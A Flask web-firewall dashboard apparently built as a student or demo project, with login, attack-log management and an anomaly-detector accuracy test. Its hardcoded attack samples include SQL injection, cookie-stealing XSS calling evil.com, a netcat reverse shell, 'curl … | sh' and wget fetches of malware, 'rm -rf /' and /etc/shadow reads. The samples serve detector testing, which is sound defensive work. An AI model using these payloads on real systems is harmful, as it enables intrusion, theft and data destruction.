from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, Response
from werkzeug.security import check_password_hash
from middleware import waf_middleware
from database import get_user_by_username, init_db, get_attack_stats, get_recent_logs, get_connection, create_user, get_all_users
from ultra_anomaly_detection import EnhancedUltraAnomalyDetector as AnomalyDetector
import os
import shutil
import csv
from datetime import datetime
import time

app = Flask(__name__)
app.secret_key = "replace-with-a-secure-random-secret"

# Initialize DB
init_db()

# Apply WAF middleware
waf_middleware(app)

@app.route('/')
def index():
    if "user_id" in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if "user_id" in session:
        return redirect(url_for('dashboard'))

    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        user = get_user_by_username(username)
        if not user:
            flash("Invalid username or password", "danger")
            return render_template('login.html', username=username)

        user_id, db_username, db_password_hash = user

        if check_password_hash(db_password_hash, password):
            session['user_id'] = user_id
            session['username'] = db_username
            flash("Login successful", "success")
            return redirect(url_for('dashboard'))
        else:
            flash("Invalid username or password", "danger")
            return render_template('login.html', username=username)

    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    return render_template('dashboard.html', username=session.get('username'))

@app.route('/monitor')
def monitor():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    stats = get_attack_stats()
    recent_logs = get_recent_logs(limit=50)
    
    return render_template('monitor.html', 
                         username=session.get('username'),
                         stats=stats,
                         logs=recent_logs)

@app.route('/tools')
def tools():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM logs")
    total_logs = cursor.fetchone()[0]
    
    cursor.execute("SELECT DISTINCT type FROM logs ORDER BY type")
    attack_types = [row[0] for row in cursor.fetchall()]
    
    cursor.execute("""
        SELECT ip, COUNT(*) as count 
        FROM logs 
        GROUP BY ip 
        ORDER BY count DESC 
        LIMIT 10
    """)
    top_ips = [dict(row) for row in cursor.fetchall()]
    
    conn.close()
    
    return render_template('tools.html', 
                         username=session.get('username'),
                         total_logs=total_logs,
                         attack_types=attack_types,
                         top_ips=top_ips)

# ==========================================
# DATABASE MANAGEMENT API
# ==========================================

@app.route('/api/db/stats')
def api_db_stats():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    conn = get_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM logs")
    total = cursor.fetchone()[0]
    
    cursor.execute("SELECT type, COUNT(*) as count FROM logs GROUP BY type ORDER BY count DESC")
    by_type = [{"type": row[0], "count": row[1]} for row in cursor.fetchall()]
    
    conn.close()
    
    return jsonify({"total": total, "by_type": by_type})

@app.route('/api/db/clear', methods=['POST'])
def api_clear_logs():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json()
    clear_type = data.get('type', 'all')
    
    conn = get_connection()
    cursor = conn.cursor()
    
    try:
        if clear_type == 'all':
            cursor.execute("SELECT COUNT(*) FROM logs")
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs")
            conn.commit()
            message = f"Deleted {count} log entries"
        
        elif clear_type == 'by_attack_type':
            attack_type = data.get('attack_type')
            cursor.execute("SELECT COUNT(*) FROM logs WHERE type = ?", (attack_type,))
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs WHERE type = ?", (attack_type,))
            conn.commit()
            message = f"Deleted {count} '{attack_type}' entries"
        
        elif clear_type == 'by_ip':
            ip = data.get('ip')
            cursor.execute("SELECT COUNT(*) FROM logs WHERE ip = ?", (ip,))
            count = cursor.fetchone()[0]
            cursor.execute("DELETE FROM logs WHERE ip = ?", (ip,))
            conn.commit()
            message = f"Deleted {count} entries from {ip}"
        
        else:
            return jsonify({"error": "Invalid clear type"}), 400
        
        conn.close()
        return jsonify({"success": True, "message": message, "deleted": count})
    
    except Exception as e:
        conn.close()
        return jsonify({"error": str(e)}), 500

@app.route('/api/db/backup', methods=['POST'])
def api_backup_db():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401
    
    backup_dir = "backups"
    db_file = "app_data.db"
    
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = os.path.join(backup_dir, f"app_data_backup_{timestamp}.db")
    
    try:
        shutil.copy2(db_file, backup_file)
        file_size = os.path.getsize(backup_file)
        return jsonify({
            "success": True,
            "message": "Backup created successfully",
            "filename": os.path.basename(backup_file),
            "size": file_size
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/db/export', methods=['GET'])
def api_export_csv():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    
    conn = get_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id, time, ip, type, payload, path, user_agent FROM logs ORDER BY id")
    
    csv_lines = ["ID,Time,IP,Type,Payload,Path,User_Agent"]
    for row in cursor.fetchall():
        row_escaped = [str(field).replace('"', '""') for field in row]
        line = ','.join([f'"{field}"' for field in row_escaped])
        csv_lines.append(line)
    
    conn.close()
    
    csv_content = '\n'.join(csv_lines)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"attack_logs_{timestamp}.csv"
    
    return Response(
        csv_content,
        mimetype="text/csv",
        headers={"Content-disposition": f"attachment; filename={filename}"}
    )

@app.route('/api/logs')
def api_logs():
    if "user_id" not in session:
        return {"error": "Unauthorized"}, 401

    limit = request.args.get('limit', 100, type=int)
    offset = request.args.get('offset', 0, type=int)
    attack_type = request.args.get('type', None)

    logs = get_recent_logs(limit=limit, offset=offset, attack_type=attack_type)
    return {"logs": [dict(log) for log in logs]}

# ==========================================
# USER MANAGEMENT
# ==========================================

@app.route('/user-management')
def user_management():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    return render_template('user_management.html', username=session.get('username'))

@app.route('/api/users')
def api_get_users():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    try:
        users = get_all_users()
        return jsonify({"success": True, "users": users})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/users/create', methods=['POST'])
def api_create_user():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    username = data.get('username', '').strip()
    password = data.get('password', '')

    # Validation
    if not username:
        return jsonify({"success": False, "error": "Username cannot be empty"}), 400

    if not password:
        return jsonify({"success": False, "error": "Password cannot be empty"}), 400

    if len(password) < 4:
        return jsonify({"success": False, "error": "Password must be at least 4 characters long"}), 400

    try:
        create_user(username, password)
        return jsonify({"success": True, "message": f"User '{username}' created successfully"})
    except Exception as e:
        error_msg = str(e)
        if "UNIQUE constraint failed" in error_msg:
            return jsonify({"success": False, "error": f"Username '{username}' already exists"}), 400
        return jsonify({"success": False, "error": error_msg}), 500

# ==========================================
# ANOMALY TESTING
# ==========================================

@app.route('/anomaly-testing')
def anomaly_testing():
    if "user_id" not in session:
        flash("Please log in to continue", "warning")
        return redirect(url_for('login'))
    return render_template('anomaly_testing.html', username=session.get('username'))

@app.route('/api/anomaly/test', methods=['POST'])
def api_anomaly_test():
    if "user_id" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    threshold = data.get('threshold', 75)

    try:
        # Create detector with ML enabled
        detector = AnomalyDetector(enable_ml=True)

        # Get samples - try to load from CSIC dataset first
        normal_samples = get_normal_samples()
        malicious_samples = get_malicious_samples()

        # Train on 70% of normal samples (more realistic training)
        train_size = int(len(normal_samples) * 0.7)
        detector.train_baseline(normal_samples[:train_size])

        # Test variables
        true_positives = 0
        false_positives = 0
        true_negatives = 0
        false_negatives = 0

        # Use remaining 30% for testing normal traffic
        test_normal_samples = normal_samples[train_size:]

        detailed_log = []
        detailed_log.append("=" * 70)
        detailed_log.append("ANOMALY DETECTION ACCURACY TEST")
        detailed_log.append("=" * 70)
        detailed_log.append(f"Training: {train_size} normal samples ({train_size/len(normal_samples)*100:.0f}%)")
        detailed_log.append(f"Testing: {len(test_normal_samples)} normal + {len(malicious_samples)} attack samples")
        detailed_log.append(f"Detector: EnhancedUltraAnomalyDetector (ML + Stats + Rules)")
        detailed_log.append("")

        # Test normal traffic
        detailed_log.append("=" * 70)
        detailed_log.append(f"TESTING NORMAL TRAFFIC ({len(test_normal_samples)} samples, threshold={threshold})")
        detailed_log.append("=" * 70)

        for i, sample in enumerate(test_normal_samples, 1):
            is_anom, score, details = detector.is_anomalous(sample, threshold=threshold)
            if is_anom:
                false_positives += 1
                detailed_log.append(f"❌ FP #{i}: {sample['path']} (Score: {score:.0f})")
            else:
                true_negatives += 1
                detailed_log.append(f"✅ TN #{i}: {sample['path']} (Score: {score:.0f})")

        detailed_log.append("")
        detailed_log.append("=" * 70)
        detailed_log.append(f"TESTING MALICIOUS TRAFFIC ({len(malicious_samples)} attack samples)")
        detailed_log.append("=" * 70)

        for i, sample in enumerate(malicious_samples, 1):
            is_anom, score, details = detector.is_anomalous(sample, threshold=threshold)
            if is_anom:
                true_positives += 1
                detailed_log.append(f"✅ TP #{i}: {sample['path']} (Score: {score:.0f})")
            else:
                false_negatives += 1
                detailed_log.append(f"❌ FN #{i}: {sample['path']} (Score: {score:.0f})")

        # Calculate metrics
        total = true_positives + false_positives + true_negatives + false_negatives
        accuracy = (true_positives + true_negatives) / total * 100 if total > 0 else 0
        precision = true_positives / (true_positives + false_positives) * 100 if (true_positives + false_positives) > 0 else 0
        recall = true_positives / (true_positives + false_negatives) * 100 if (true_positives + false_negatives) > 0 else 0
        f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
        specificity = true_negatives / (true_negatives + false_positives) * 100 if (true_negatives + false_positives) > 0 else 0

        # Add summary to log
        detailed_log.append("")
        detailed_log.append("=" * 70)
        detailed_log.append("PERFORMANCE METRICS")
        detailed_log.append("=" * 70)
        detailed_log.append(f"Total Test Cases:    {total}")
        detailed_log.append(f"True Positives:      {true_positives:3d}  (Attacks correctly detected)")
        detailed_log.append(f"False Positives:     {false_positives:3d}  (Normal traffic wrongly blocked)")
        detailed_log.append(f"True Negatives:      {true_negatives:3d}  (Normal traffic correctly allowed)")
        detailed_log.append(f"False Negatives:     {false_negatives:3d}  (Attacks missed)")
        detailed_log.append("-" * 70)
        detailed_log.append(f"Accuracy:            {accuracy:.2f}%")
        detailed_log.append(f"Precision:           {precision:.2f}%")
        detailed_log.append(f"Recall (Sensitivity):{recall:.2f}%")
        detailed_log.append(f"Specificity:         {specificity:.2f}%")
        detailed_log.append(f"F1-Score:            {f1_score:.2f}%")
        detailed_log.append("=" * 70)

        if accuracy >= 80:
            detailed_log.append("")
            detailed_log.append("✅ OBJECTIVE 3 SUCCESSFULLY MET!")
            detailed_log.append(f"   Anomaly detection achieved {accuracy:.2f}% accuracy (≥80% required)")
        else:
            detailed_log.append("")
            detailed_log.append("⚠️  OBJECTIVE 3 NOT MET")
            detailed_log.append(f"   Anomaly detection achieved {accuracy:.2f}% accuracy (need ≥80%)")

        detailed_log.append("=" * 70)

        return jsonify({
            "success": True,
            "results": {
                "tp": true_positives,
                "fp": false_positives,
                "tn": true_negatives,
                "fn": false_negatives,
                "accuracy": accuracy,
                "precision": precision,
                "recall": recall,
                "f1_score": f1_score,
                "specificity": specificity,
                "detailed_log": "<br>".join(detailed_log)
            }
        })

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

def get_normal_samples():
    """Get normal traffic samples - try to load from CSIC dataset first"""

    # Try to load from CSIC CSV dataset
    if os.path.exists('datasets/csic2010/CSIC_2010.csv'):
        try:
            normal_samples = []
            with open('datasets/csic2010/CSIC_2010.csv', 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                next(reader)  # Skip header

                for row in reader:
                    if len(row) >= 3 and row[0].strip() == 'Normal':
                        url = row[-1].strip()
                        normal_samples.append({
                            'ip': '192.168.1.100',
                            'path': '',
                            'payload': url,
                            'timestamp': time.time()
                        })

                        # Limit to 100 samples for testing performance
                        if len(normal_samples) >= 100:
                            break

            if len(normal_samples) >= 50:
                print(f"[Anomaly Test] Loaded {len(normal_samples)} normal samples from CSIC dataset")
                return normal_samples
        except Exception as e:
            print(f"[Anomaly Test] Could not load CSIC dataset: {e}")

    # Fallback to hardcoded samples if CSIC not available
    print("[Anomaly Test] Using hardcoded normal samples")
    return [
        {'ip': '192.168.1.10', 'path': '/login', 'payload': 'username=john&password=pass123', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/login', 'payload': 'username=alice&password=secret456', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/login', 'payload': 'username=bob&password=mypass789', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 5},
        {'ip': '192.168.1.12', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 10},
        {'ip': '192.168.1.10', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 15},
        {'ip': '192.168.1.13', 'path': '/dashboard', 'payload': '', 'timestamp': time.time() + 20},
        {'ip': '192.168.1.10', 'path': '/monitor', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/monitor', 'payload': '', 'timestamp': time.time() + 7},
        {'ip': '192.168.1.10', 'path': '/profile', 'payload': 'name=John Doe&email=john@example.com', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/profile', 'payload': 'name=Alice Smith&bio=Developer', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/profile', 'payload': 'name=Bob Jones&phone=1234567890', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/search', 'payload': 'query=cybersecurity', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/search', 'payload': 'query=web application', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/search', 'payload': 'query=firewall tutorial', 'timestamp': time.time()},
        {'ip': '192.168.1.13', 'path': '/search', 'payload': 'query=python programming', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/api/logs', 'payload': 'limit=50&offset=0', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/api/logs', 'payload': 'limit=100', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/api/logs', 'payload': 'type=SQL Injection', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/contact', 'payload': 'name=User&message=Hello world', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/feedback', 'payload': 'rating=5&comment=Great app', 'timestamp': time.time()},
        {'ip': '192.168.1.12', 'path': '/support', 'payload': 'issue=Login problem', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/', 'payload': '', 'timestamp': time.time() + 2},
        {'ip': '192.168.1.12', 'path': '/', 'payload': '', 'timestamp': time.time() + 4},
        {'ip': '192.168.1.10', 'path': '/logout', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/logout', 'payload': '', 'timestamp': time.time() + 3},
        {'ip': '192.168.1.10', 'path': '/settings', 'payload': 'theme=dark&language=en', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/settings', 'payload': 'notifications=true', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/download/report.pdf', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.11', 'path': '/download/data.csv', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/change-password', 'payload': 'old=pass123&new=newpass456', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/verify', 'payload': 'token=abc123def456', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/upload', 'payload': 'file=avatar.jpg&size=50KB', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/calendar', 'payload': 'date=2025-11-07', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/help', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/about', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/faq', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/terms', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/privacy', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/docs', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/api/status', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/health', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/metrics', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/news', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/blog', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/gallery', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/portfolio', 'payload': '', 'timestamp': time.time()},
        {'ip': '192.168.1.10', 'path': '/team', 'payload': '', 'timestamp': time.time()},
    ]

def get_malicious_samples():
    """Get malicious traffic samples - try to load from CSIC dataset first"""

    # Try to load from CSIC CSV dataset
    if os.path.exists('datasets/csic2010/CSIC_2010.csv'):
        try:
            attack_samples = []
            with open('datasets/csic2010/CSIC_2010.csv', 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                next(reader)  # Skip header

                for row in reader:
                    if len(row) >= 3 and row[0].strip() == 'Anomalous':
                        url = row[-1].strip()
                        attack_samples.append({
                            'ip': '10.0.0.100',
                            'path': '',
                            'payload': url,
                            'timestamp': time.time()
                        })

                        # Limit to 50 attack samples for testing
                        if len(attack_samples) >= 50:
                            break

            if len(attack_samples) >= 30:
                print(f"[Anomaly Test] Loaded {len(attack_samples)} attack samples from CSIC dataset")
                return attack_samples
        except Exception as e:
            print(f"[Anomaly Test] Could not load attack samples from CSIC dataset: {e}")

    # Fallback to hardcoded attack samples if CSIC not available
    print("[Anomaly Test] Using hardcoded attack samples")
    return [
        # SQL Injection
        {'ip': '10.0.0.1', 'path': '/login', 'payload': "username=' OR '1'='1&password=anything", 'timestamp': time.time()},
        {'ip': '10.0.0.2', 'path': '/search', 'payload': "query=' UNION SELECT * FROM users--", 'timestamp': time.time()},
        {'ip': '10.0.0.3', 'path': '/product', 'payload': "id=1'; DROP TABLE products;--", 'timestamp': time.time()},
        {'ip': '10.0.0.4', 'path': '/user', 'payload': "id=1 OR 1=1", 'timestamp': time.time()},
        {'ip': '10.0.0.5', 'path': '/admin', 'payload': "username=admin'--", 'timestamp': time.time()},
        {'ip': '10.0.0.6', 'path': '/api', 'payload': "filter=' AND 1=2 UNION SELECT password FROM users--", 'timestamp': time.time()},
        {'ip': '10.0.0.7', 'path': '/data', 'payload': "sort=name'; DELETE FROM logs;--", 'timestamp': time.time()},
        {'ip': '10.0.0.8', 'path': '/query', 'payload': "search=' OR 'x'='x", 'timestamp': time.time()},
        {'ip': '10.0.0.9', 'path': '/items', 'payload': "category=1' UNION ALL SELECT NULL,NULL,NULL--", 'timestamp': time.time()},
        {'ip': '10.0.0.10', 'path': '/auth', 'payload': "user=admin' AND '1'='1", 'timestamp': time.time()},
        {'ip': '10.0.0.11', 'path': '/login', 'payload': "pass=' OR 1=1--", 'timestamp': time.time()},
        {'ip': '10.0.0.12', 'path': '/view', 'payload': "id=1' AND SLEEP(5)--", 'timestamp': time.time()},
        {'ip': '10.0.0.13', 'path': '/check', 'payload': "value=1' UNION SELECT table_name FROM information_schema.tables--", 'timestamp': time.time()},
        {'ip': '10.0.0.14', 'path': '/load', 'payload': "file=../../../etc/passwd' OR '1'='1", 'timestamp': time.time()},
        {'ip': '10.0.0.15', 'path': '/fetch', 'payload': "data=1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--", 'timestamp': time.time()},

        # XSS
        {'ip': '10.0.0.16', 'path': '/comment', 'payload': '<script>alert("XSS")</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.17', 'path': '/post', 'payload': '<img src=x onerror=alert(1)>', 'timestamp': time.time()},
        {'ip': '10.0.0.18', 'path': '/message', 'payload': '<svg onload=alert(document.cookie)>', 'timestamp': time.time()},
        {'ip': '10.0.0.19', 'path': '/profile', 'payload': 'bio=<iframe src=javascript:alert(1)></iframe>', 'timestamp': time.time()},
        {'ip': '10.0.0.20', 'path': '/update', 'payload': 'name=<body onload=alert("XSS")>', 'timestamp': time.time()},
        {'ip': '10.0.0.21', 'path': '/submit', 'payload': '<input onfocus=alert(1) autofocus>', 'timestamp': time.time()},
        {'ip': '10.0.0.22', 'path': '/form', 'payload': '<select onfocus=alert(1) autofocus>', 'timestamp': time.time()},
        {'ip': '10.0.0.23', 'path': '/edit', 'payload': '<textarea onfocus=alert(1) autofocus>', 'timestamp': time.time()},
        {'ip': '10.0.0.24', 'path': '/chat', 'payload': '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>', 'timestamp': time.time()},
        {'ip': '10.0.0.25', 'path': '/review', 'payload': '<script>document.location="http://evil.com"</script>', 'timestamp': time.time()},
        {'ip': '10.0.0.26', 'path': '/feedback', 'payload': '<a href="javascript:alert(1)">Click</a>', 'timestamp': time.time()},
        {'ip': '10.0.0.27', 'path': '/note', 'payload': '<object data="javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.28', 'path': '/desc', 'payload': '<embed src="javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.29', 'path': '/bio', 'payload': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', 'timestamp': time.time()},
        {'ip': '10.0.0.30', 'path': '/title', 'payload': '<link rel="stylesheet" href="javascript:alert(1)">', 'timestamp': time.time()},

        # Command Injection
        {'ip': '10.0.0.31', 'path': '/ping', 'payload': 'host=127.0.0.1; cat /etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.32', 'path': '/exec', 'payload': 'cmd=ls | nc attacker.com 1234', 'timestamp': time.time()},
        {'ip': '10.0.0.33', 'path': '/run', 'payload': 'script=$(whoami)', 'timestamp': time.time()},
        {'ip': '10.0.0.34', 'path': '/shell', 'payload': 'command=;rm -rf /', 'timestamp': time.time()},
        {'ip': '10.0.0.35', 'path': '/system', 'payload': 'input=`id`', 'timestamp': time.time()},
        {'ip': '10.0.0.36', 'path': '/execute', 'payload': 'program=nc -e /bin/sh 10.0.0.1 4444', 'timestamp': time.time()},
        {'ip': '10.0.0.37', 'path': '/process', 'payload': 'file=test.txt; curl http://evil.com/backdoor.sh | sh', 'timestamp': time.time()},
        {'ip': '10.0.0.38', 'path': '/convert', 'payload': 'input=$(cat /etc/shadow)', 'timestamp': time.time()},
        {'ip': '10.0.0.39', 'path': '/backup', 'payload': 'path=/data && wget http://evil.com/malware', 'timestamp': time.time()},
        {'ip': '10.0.0.40', 'path': '/restore', 'payload': 'archive=backup.tar; chmod 777 /etc/passwd', 'timestamp': time.time()},

        # Directory Traversal
        {'ip': '10.0.0.41', 'path': '/download', 'payload': 'file=../../../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.42', 'path': '/view', 'payload': 'doc=../../../windows/system32/config/sam', 'timestamp': time.time()},
        {'ip': '10.0.0.43', 'path': '/read', 'payload': 'path=....//....//....//etc/shadow', 'timestamp': time.time()},
        {'ip': '10.0.0.44', 'path': '/get', 'payload': 'resource=..\\..\\..\\boot.ini', 'timestamp': time.time()},
        {'ip': '10.0.0.45', 'path': '/file', 'payload': 'name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'timestamp': time.time()},
        {'ip': '10.0.0.46', 'path': '/include', 'payload': 'page=../../../../../../etc/hosts', 'timestamp': time.time()},
        {'ip': '10.0.0.47', 'path': '/load', 'payload': 'template=../config/database.yml', 'timestamp': time.time()},
        {'ip': '10.0.0.48', 'path': '/show', 'payload': 'document=/var/www/../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.49', 'path': '/open', 'payload': 'doc=/var/www/../../etc/passwd', 'timestamp': time.time()},
        {'ip': '10.0.0.29', 'path': '/fetch', 'payload': 'resource=file:///etc/passwd', 'timestamp': time.time()},
    ]

@app.route('/logout')
def logout():
    session.clear()
    flash("Logged out", "info")
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)